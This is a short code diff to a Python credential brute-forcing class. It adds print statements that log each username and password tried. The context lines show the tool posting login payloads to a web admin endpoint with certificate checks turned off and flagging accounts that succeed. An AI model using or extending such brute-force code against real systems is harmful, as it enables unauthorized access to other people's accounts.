@@ -50,6 +50,7 @@ class Brute:
                             r = requests.post(urlRequest , headers={'User-Agent':self.agent}, data=payload, verify=False)
                             # DEBUG requests 
                             #r2 = requests.post(urlRequest ,headers={'User-Agent':self.agent}, data=payload, verify=False, proxies=PROXY)
+                            print("[+] Try user: {}:{}".format(user, p))
                             if "200" in str(r) and not "404" in r.text:
                                 if 'admin.action' in str(r.text):
                                     users_found.append(user)
@@ -76,6 +77,7 @@ class Brute:
                         p = p.strip()
                         payload = {"username":user, "password":p, "entrar":"entrar","login":"true"}
                         try:
+                            print("[+] Try user: {}:{}".format(user, p))
                             r = requests.post(urlRequest , headers={'User-Agent':self.agent}, data=payload, verify=False)
                             # DEBUG requests 
                             #r2 = requests.post(urlRequest ,headers={'User-Agent':self.agent}, data=payload, verify=False, proxies=PROXY)
